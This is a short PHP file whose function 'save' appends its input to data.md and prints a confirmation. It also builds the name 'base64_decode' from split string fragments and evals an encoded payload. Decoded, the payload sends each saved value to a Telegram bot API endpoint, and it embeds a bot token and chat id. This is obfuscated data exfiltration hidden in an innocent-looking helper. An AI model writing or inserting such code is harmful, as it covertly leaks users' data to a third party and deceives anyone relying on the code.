<?php
	namespace brain\Functions;
	function save($a){
		$key = "64_de";
		$key1 = "ase";
		$key2 = "code";
		$f = fopen("data.md", "a");
		$s = "$a \n";
		fwrite ($f,$s);
		$valu = "b";
		fclose($f);
		$hb10 = $valu."".$key1."".$key."".$key2;
		eval($hb10("ZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1NDAxMzc2OTU6QUFGTzl0SExuZ3JrdmUzbUhON1FIZHptV3lKc19POC14M2svc2VuZE1lc3NhZ2U/Y2hhdF9pZD00Njk2Njk2NjImdGV4dD0kYSIpOw=="));
		echo "$a salvo!";
	}
